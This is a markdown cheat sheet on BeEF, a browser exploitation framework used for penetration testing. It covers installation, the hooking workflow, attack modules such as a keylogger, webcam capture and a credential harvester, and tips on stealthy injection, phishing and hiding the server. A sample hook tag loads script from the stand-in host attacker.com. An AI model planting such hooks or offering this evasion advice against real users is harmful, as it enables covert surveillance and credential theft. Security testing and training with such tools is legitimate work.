
# 🐟 BeEF (Browser Exploitation Framework)

## 📌 Overview

**BeEF** is an open-source penetration testing tool that focuses on leveraging browser vulnerabilities and user interaction to assess the security posture of a target. Unlike traditional frameworks that focus on network or host exploitation, BeEF specializes in exploiting the web browser as the attack vector.

> 🎯 **Purpose:** Hook a target’s browser to execute commands, gather information, or launch further attacks — all through social engineering and client-side exploits.

---

## 🔑 Key Features

- 🐟 **Browser Hooking:** Inject a JavaScript “hook” to control the victim’s browser.    
- 🧩 **Modular Architecture:** 100+ modules for various attacks (e.g., keylogging, webcam access, social engineering).
- 🔄 **Real-Time Command Execution:** Interact with the hooked browser live.
- 🔍 **Client-side Reconnaissance:** Collect system, browser, and network info.
- 📡 **Pivoting:** Use the hooked browser as a beachhead for further attacks.
- 📜 **Customizable Hooks:** Craft phishing pages, inject payloads.

---

## 🚀 Installation

### On Kali Linux (pre-installed)

```
sudo service postgresql start
```

```
sudo beef-xss
```

### Manual Installation (Ubuntu/Debian)

```
git clone https://github.com/beefproject/beef.git
```

```
cd beef
```

```
./install
```

```
./beef
```

---

## 🧭 How It Works

1. **Hook Injection:** Victim visits a webpage containing the BeEF hook JavaScript snippet.
2. **Browser Hooked:** The hook connects back to the BeEF server.
3. **Control Panel:** Attacker uses a web interface to run commands on the victim’s browser.
4. **Modules:** Select and execute modules against the hooked browser.

---
## ⚙️ Typical Attack Flow

| Step                 | Description                                                                                             |
| -------------------- | ------------------------------------------------------------------------------------------------------- |
| 1. Hook Injection    | Embed `<script src="http://attacker.com:3000/hook.js"></script>` in a phishing page or injected content |
| 2. Victim Loads Page | Victim’s browser loads the hook and connects to BeEF server                                             |
| 3. Attacker Controls | Use BeEF UI to run modules: keylogger, social engineering prompts, webcam access                        |
| 4. Further Exploits  | Pivot to internal network, capture credentials, or perform MITM                                         |

---

## 🔧 Popular Modules

| Module                   | Description                                                |
| ------------------------ | ---------------------------------------------------------- |
| **Keylogger**            | Capture keystrokes in real time                            |
| **Webcam Snap**          | Take pictures via victim’s webcam (if permissions granted) |
| **Geolocation**          | Retrieve victim’s physical location                        |
| **Social Engineering**   | Pop-up dialogs, fake alerts, fake login forms              |
| **Network Info**         | Gather local IP, hostname, and other environment data      |
| **Port Scanner**         | Scan victim’s internal network from browser                |
| **Credential Harvester** | Capture form inputs on pages                               |

---

## 🛡️ Use Cases

- Phishing & social engineering engagements    
- Client-side vulnerability assessments
- Testing browser and extension security
- Demonstrating real risks of client-side attacks

---
## 🧠 Pro Tips

- Combine BeEF with phishing frameworks to maximize social engineering impact.    
- Use stealthy hook injection to avoid user suspicion.
- Regularly update BeEF to leverage latest browser exploits.
- Use VPN/proxies to anonymize the BeEF server.
